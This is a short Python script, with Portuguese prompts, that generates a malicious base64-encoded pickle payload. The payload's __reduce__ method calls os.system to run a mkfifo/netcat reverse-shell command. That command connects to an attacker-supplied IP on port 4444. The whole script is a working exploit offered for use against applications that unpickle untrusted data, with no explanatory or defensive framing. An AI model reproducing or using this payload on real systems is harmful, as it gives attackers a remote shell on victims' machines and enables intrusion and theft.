import pickle
import sys
import base64

print ("Porta a ser aberta sera 4444")
pegar= input("passe o ip= ")
command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat '+pegar+' 4444 > /tmp/f'


class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
